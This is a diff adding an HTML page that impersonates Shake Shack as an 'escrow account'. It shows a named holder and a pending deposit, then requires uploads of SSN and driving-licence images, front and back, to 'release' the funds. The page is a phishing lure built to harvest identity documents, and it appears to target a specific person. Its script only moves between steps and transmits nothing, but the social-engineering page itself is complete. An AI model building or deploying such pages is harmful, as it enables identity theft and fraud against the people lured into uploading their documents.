@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shake Shack - Escrow Account</title>
+    <style>
+        :root {
+            --primary-color: #000000;
+            --accent-color: #28a745;
+            --bg-color: #f4f6f9;
+            --card-bg: #ffffff;
+            --text-color: #333333;
+            --border-color: #ddd;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        header h1 {
+            font-size: 24px;
+            color: var(--primary-color);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        header h1 .escrow-text {
+            font-style: italic;
+            font-weight: normal;
+            color: #555;
+        }
+
+        .account-info {
+            background: #fafafa;
+            border: 1px solid var(--border-color);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .account-info p {
+            font-size: 14px;
+            margin-bottom: 5px;
+            color: #666;
+        }
+
+        .account-info h3 {
+            font-size: 16px;
+            color: var(--primary-color);
+        }
+
+        .transaction-section {
+            margin-bottom: 25px;
+        }
+
+        .transaction-section h3 {
+            font-size: 15px;
+            margin-bottom: 10px;
+            color: #555;
+        }
+
+        .transaction-card {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 15px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            background: #fff;
+        }
+
+        .transaction-details .title {
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .transaction-details .status {
+            font-size: 12px;
+            color: #e67e22;
+            font-weight: 500;
+        }
+
+        .transaction-amount {
+            color: var(--accent-color);
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .btn {
+            width: 100%;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+            text-align: center;
+        }
+
+        .btn:hover {
+            background-color: #333;
+        }
+
+        /* Modal / Steps styling */
+        .step-content {
+            display: none;
+        }
+
+        .step-content.active {
+            display: block;
+        }
+
+        .upload-group {
+            margin-bottom: 15px;
+        }
+
+        .upload-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            color: #444;
+        }
+
+        .file-drop-box {
+            border: 2px dashed var(--border-color);
+            padding: 12px;
+            text-align: center;
+            border-radius: 6px;
+            background: #fafafa;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .file-drop-box input[type="file"] {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            opacity: 0;
+            cursor: pointer;
+        }
+
+        .file-drop-box span {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .success-message {
+            text-align: center;
+            padding: 30px 0;
+        }
+
+        .success-message h2 {
+            font-size: 20px;
+            color: var(--accent-color);
+            margin-bottom: 10px;
+        }
+
+        .success-message p {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Step 1: Main Dashboard -->
+        <div id="step-dashboard" class="step-content active">
+            <header>
+                <h1>Shake Shack <br><span class="escrow-text">- Escrow Account</span></h1>
+            </header>
+
+            <div class="account-info">
+                <p>Account Holder Name:</p>
+                <h3>CARMEN ROSA WILLIE</h3>
+            </div>
+
+            <div class="transaction-section">
+                <h3>Transaction History</h3>
+                <div class="transaction-card">
+                    <div class="transaction-details">
+                        <div class="title">Incoming Escrow Deposit</div>
+                        <div class="status">Pending Verification</div>
+                    </div>
+                    <div class="transaction-amount">+$...</div>
+                </div>
+            </div>
+
+            <button class="btn" onclick="goToUploadStep()">Click to approve your pending money</button>
+        </div>
+
+        <!-- Step 2: Upload Documents -->
+        <div id="step-upload" class="step-content">
+            <header>
+                <h1>Verification <br><span class="escrow-text">- Required Documents</span></h1>
+            </header>
+
+            <form id="uploadForm" onsubmit="handleConfirm(event)">
+                <div class="upload-group">
+                    <label>SSN Image (Front)</label>
+                    <div class="file-drop-box">
+                        <span>Tap to upload or drag image</span>
+                        <input type="file" accept="image/*" required>
+                    </div>
+                </div>
+
+                <div class="upload-group">
+                    <label>SSN Image (Back)</label>
+                    <div class="file-drop-box">
+                        <span>Tap to upload or drag image</span>
+                        <input type="file" accept="image/*" required>
+                    </div>
+                </div>
+
+                <div class="upload-group">
+                    <label>DRIVING LICENCE Image (Front)</label>
+                    <div class="file-drop-box">
+                        <span>Tap to upload or drag image</span>
+                        <input type="file" accept="image/*" required>
+                    </div>
+                </div>
+
+                <div class="upload-group">
+                    <label>DRIVING LICENCE Image (Back)</label>
+                    <div class="file-drop-box">
+                        <span>Tap to upload or drag image</span>
+                        <input type="file" accept="image/*" required>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn" style="margin-top: 10px;">Confirm</button>
+            </form>
+        </div>
+
+        <!-- Step 3: Success / 24 Hours Notice -->
+        <div id="step-success" class="step-content">
+            <div class="success-message">
+                <h2>Verification Submitted</h2>
+                <p>Thank you. Your documents have been received successfully. Please <strong>wait before 24 hours</strong> for the account verification and fund release process to complete.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function goToUploadStep() {
+            document.getElementById('step-dashboard').classList.remove('active');
+            document.getElementById('step-upload').classList.add('active');
+        }
+
+        function handleConfirm(event) {
+            event.preventDefault();
+            document.getElementById('step-upload').classList.remove('active');
+            document.getElementById('step-success').classList.add('active');
+        }
+    </script>
+
+</body>
+</html>
